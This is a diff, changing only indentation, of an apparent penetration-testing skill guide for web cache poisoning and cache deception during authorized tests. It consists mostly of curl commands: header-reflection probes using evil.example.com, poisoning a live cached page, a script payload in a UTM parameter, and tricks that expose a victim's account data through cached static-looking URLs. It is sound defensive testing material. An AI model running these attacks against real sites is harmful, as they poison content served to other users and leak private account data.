@@ -1,8 +1,8 @@
 ---
 name: performing-web-cache-poisoning-attack
 description: Exploiting web cache mechanisms to serve malicious content to other users
-  by poisoning cached responses through unkeyed headers and parameters during authorized
-  security tests.
+ by poisoning cached responses through unkeyed headers and parameters during authorized
+ security tests.
 domain: cybersecurity
 subdomain: web-application-security
 tags:
@@ -58,7 +58,7 @@ Determine what caching infrastructure is in use and how the cache key is constru
 ```bash
 # Check cache-related response headers
 curl -s -I "https://target.example.com/" | grep -iE \
-  "(cache-control|x-cache|cf-cache|age|vary|x-varnish|x-served-by|cdn|via)"
+ "(cache-control|x-cache|cf-cache|age|vary|x-varnish|x-served-by|cdn|via)"
 
 # Common cache indicators:
 # X-Cache: HIT / MISS
@@ -106,19 +106,19 @@ CB="cachebuster=$(date +%s)"
 
 # Test X-Forwarded-Host reflection
 curl -s -H "X-Forwarded-Host: evil.example.com" \
-  "https://target.example.com/?$CB" | grep "evil.example.com"
+ "https://target.example.com/?$CB" | grep "evil.example.com"
 
 # Test X-Forwarded-Scheme
 curl -s -H "X-Forwarded-Scheme: nothttps" \
-  "https://target.example.com/?$CB" | grep "nothttps"
+ "https://target.example.com/?$CB" | grep "nothttps"
 
 # Test X-Original-URL (path override)
 curl -s -H "X-Original-URL: /admin" \
-  "https://target.example.com/?$CB"
+ "https://target.example.com/?$CB"
 
 # Test X-Forwarded-Proto
 curl -s -H "X-Forwarded-Proto: http" \
-  "https://target.example.com/?$CB" | grep "http://"
+ "https://target.example.com/?$CB" | grep "http://"
 ```
 
 ### Step 3: Exploit Unkeyed Header for Cache Poisoning
@@ -132,13 +132,13 @@ Craft requests that poison cached responses with malicious content.
 
 # Step 1: Confirm reflection with cache buster
 curl -s -H "X-Forwarded-Host: evil.example.com" \
-  "https://target.example.com/?cb=unique123" | \
-  grep "evil.example.com"
+ "https://target.example.com/?cb=unique123" | \
+ grep "evil.example.com"
 
 # Step 2: Poison the actual cached page (WITHOUT cache buster)
 # WARNING: This affects all users - only do with explicit authorization
 curl -s -H "X-Forwarded-Host: evil.example.com" \
-  "https://target.example.com/"
+ "https://target.example.com/"
 
 # Step 3: Verify cache is poisoned
 curl -s "https://target.example.com/" | grep "evil.example.com"
@@ -146,14 +146,14 @@ curl -s "https://target.example.com/" | grep "evil.example.com"
 
 # Attack with X-Forwarded-Proto for HTTP downgrade
 curl -s -H "X-Forwarded-Proto: http" \
-  "https://target.example.com/?cb=unique456"
+ "https://target.example.com/?cb=unique456"
 # May cause cached response to include http:// links, enabling MitM
 
 # Attack with multiple headers
 curl -s \
-  -H "X-Forwarded-Host: evil.example.com" \
-  -H "X-Forwarded-Proto: https" \
-  "https://target.example.com/?cb=unique789"
+ -H "X-Forwarded-Host: evil.example.com" \
+ -H "X-Forwarded-Proto: https" \
+ "https://target.example.com/?cb=unique789"
 ```
 
 ### Step 4: Test Web Cache Deception
@@ -172,8 +172,8 @@ Trick the cache into storing authenticated responses for public URLs.
 
 # Test application path handling
 curl -s -H "Authorization: Bearer $VICTIM_TOKEN" \
-  "https://target.example.com/account/profile/test.css" | \
-  grep -i "email\|name\|balance"
+ "https://target.example.com/account/profile/test.css" | \
+ grep -i "email\|name\|balance"
 
 # Step 2: As attacker (unauthenticated), request:
 curl -s "https://target.example.com/account/profile/test.css"
@@ -181,11 +181,11 @@ curl -s "https://target.example.com/account/profile/test.css"
 
 # Test various static extensions
 for ext in css js jpg png gif ico svg woff woff2 ttf; do
-  echo -n ".$ext: "
-  curl -s -H "Authorization: Bearer $TOKEN" \
-    -o /dev/null -w "%{http_code} %{size_download}" \
-    "https://target.example.com/account/settings/x.$ext"
-  echo
+ echo -n ".$ext: "
+ curl -s -H "Authorization: Bearer $TOKEN" \
+ -o /dev/null -w "%{http_code} %{size_download}" \
+ "https://target.example.com/account/settings/x.$ext"
+ echo
 done
 
 # Test path confusion patterns
@@ -202,7 +202,7 @@ Exploit unkeyed query parameters or parameter parsing differences.
 # Unkeyed parameter (parameter not in cache key but reflected)
 # Using UTM parameters that are often excluded from cache keys
 curl -s "https://target.example.com/?utm_content=<script>alert(1)</script>&cb=$(date +%s)" | \
-  grep "alert"
+ grep "alert"
 
 # Parameter cloaking via parsing differences
 # Backend sees: callback=evil, Cache key ignores: callback
@@ -210,9 +210,9 @@ curl -s "https://target.example.com/jsonp?callback=alert(1)&cb=$(date +%s)"
 
 # Fat GET request (body in GET request)
 curl -s -X GET \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "param=evil_value" \
-  "https://target.example.com/page?cb=$(date +%s)"
+ -H "Content-Type: application/x-www-form-urlencoded" \
+ -d "param=evil_value" \
+ "https://target.example.com/page?cb=$(date +%s)"
 
 # Cache key normalization differences
 # Some caches normalize query string order, some don't
@@ -221,7 +221,7 @@ curl -s "https://target.example.com/page?b=2&a=1" # Same key? Or different?
 
 # Test port-based cache poisoning
 curl -s -H "Host: target.example.com:1234" \
-  "https://target.example.com/?cb=$(date +%s)" | grep "1234"
+ "https://target.example.com/?cb=$(date +%s)" | grep "1234"
 ```
 
 ### Step 6: Validate Impact and Clean Up
@@ -232,7 +232,7 @@ Confirm the attack impact and ensure poisoned cache entries are cleared.
 # Verify poisoned cache serves to other users
 # Use a different IP/User-Agent/session to verify
 curl -s -H "User-Agent: CacheVerification" \
-  "https://target.example.com/" | grep "evil"
+ "https://target.example.com/" | grep "evil"
 
 # Check cache TTL to understand exposure window
 curl -s -I "https://target.example.com/" | grep -i "cache-control\|max-age\|s-maxage"
